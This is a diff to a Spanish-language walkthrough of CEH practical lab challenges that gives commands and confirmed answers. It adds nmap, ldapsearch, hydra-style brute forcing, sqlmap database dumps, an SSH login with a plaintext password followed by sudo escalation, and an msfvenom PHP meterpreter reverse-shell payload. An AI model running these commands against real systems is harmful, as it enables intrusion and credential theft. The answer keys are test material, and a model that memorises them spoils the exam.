@@ -9,6 +9,10 @@ Cada desafío incluye el comando/herramienta a usar y la respuesta ya confirmada
 nmap -A [rango subred]
 ```
 Revisa el banner del puerto 389/445/88; nmap suele imprimir la versión de Windows Server directamente.
+nmap -p 389 -sV -iL  IP 
+nmap -p 389 -sV [host+domain]
+ldapsearch -x -h IP "DC=CEH,DC=com"
+
 **ANS: 10.0.20348**
 
 ---
@@ -33,12 +37,19 @@ hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://[IP]
 ```
 3. Conéctate y ubica `hide.cfe`:
 ```
+Remmina
+rdesktop 
+
 xfreerdp /u:Jones /p:<password> /v:[IP]
 ```
 4. `.cfe` es un contenedor de **CryptoForge** — descífralo con la contraseña de Jones (GUI de CryptoForge Decrypt).
 5. Calcula el CRC32 de la imagen resultante (usa un calculador CRC32 — HashCalc o `crc32` de Python/7-Zip):
 ```
 python3 -c "import zlib; print(hex(zlib.crc32(open('imagen.ext','rb').read())))"
+
+
+
+
 ```
 **ANS: 2bb407ea**
 
@@ -46,6 +57,8 @@ python3 -c "import zlib; print(hex(zlib.crc32(open('imagen.ext','rb').read())))"
 
 ### Challenge 4 — Esteganografía en dispositivo móvil
 1. Accede al dispositivo (ADB si hay debugging habilitado):
+
+nmap -p5555 --open -T4 
 ```
 adb connect [IP]:5555
 adb shell
@@ -63,6 +76,7 @@ steghide extract -sf imagen.jpg
 1. Escaneo de vulnerabilidades con OpenVAS sobre 192.168.44.32.
 2. Ordena por severidad ascendente en el reporte.
 **ANS: CVE-2020-7068**
+nmap -sV -p- -T4  IP 
 
 ---
 
@@ -132,6 +146,15 @@ cat imroot.txt
 **ANS: JH8754@#!**
 
 ---
+nmap -sV -p 22 IP/24 
+ssh marcus@IP        M3rcy@123
+sudo -l 
+sudo -i 
+cd / find . -name imroot.txt 
+cat givenpatch/imroot.txt 
+
+
+
 
 ### Challenge 10 — Contar archivos en carpeta "Scan" vía RAT
 Conéctate a la sesión activa del RAT/Meterpreter ya desplegado:
@@ -176,6 +199,8 @@ tshark -r Evil-traffic.pcapng -q -z conv,ip
 ```
 **ANS: 19554 paquetes / IP 172.20.0.21**
 
+tcp.flags.sy==1 and tcp.flags.ack==0
+find 172.22.10.10.
 ---
 
 ### Challenge 13 — SQLi en cinema.cehorg.com, password de Daniel
@@ -183,6 +208,14 @@ tshark -r Evil-traffic.pcapng -q -z conv,ip
 sqlmap -u "http://cinema.cehorg.com/<endpoint>" --cookie="<sesión con Karen/computer>" -D <db> -T users --dump
 ```
 (o inyección manual si el punto de entrada es un formulario de login/búsqueda)
+
+
+sqlmap -u URL --cookie COOKIE --dbs
+sqlmap -u URL --cookie COOKIE -D Db  --tables
+sqlmap -u URL --cookie COOKIE -D Db  -T tables --dump
+
+
+
 **ANS: qwertyuiop**
 
 ---
@@ -207,6 +240,13 @@ wpscan --url http://10.10.55.50 --enumerate vp
 ```
 2. Explota con el exploit correspondiente (Metasploit/searchsploit) para obtener LFI/RCE y leer `Flag.txt`.
 **ANS: M@d(y535**
+scan . It can befile upload  File inclusion
+msfconsole
+msfvenom -p php/meterpreter/reverse_tcp LHOST=IPofparrot LPORT=4444 -f raw   exploit.php
+use exploit/multihandler/reverse_tcp
+set LHOST ip
+training.cehorg.com/flag.txt
+
 
 ---
 
@@ -217,6 +257,12 @@ sqlmap -u "..." -D <db> --tables
 sqlmap -u "..." -D <db> -T <tabla> -C Flag --dump
 ```
 **ANS: y83r5EC**
+wapiti -u URL  -m sql 
+sqlmap -u UR  --dbs 
+sqlmap -u VULIP -D Database --tables 
+sqlmap -u VULIP -D Database -T tablesname --columns 
+
+sqlmap -u VULIP -D Database -T tablename -C column  --dump 
 
 ---
 
@@ -229,6 +275,11 @@ C:\wamp64\www\DVWA\ECweb\Certified\
 ```
 cat archivo.txt | base64 -d
 ```
+open url http://192.168.44.32:8080/DVWA
+login  admin/password
+c:\wamp64\www\DVWA\ECweb\Certified
+we can use base64 -d file 
+
 **ANS: H^(ker@EC**
 
 ---
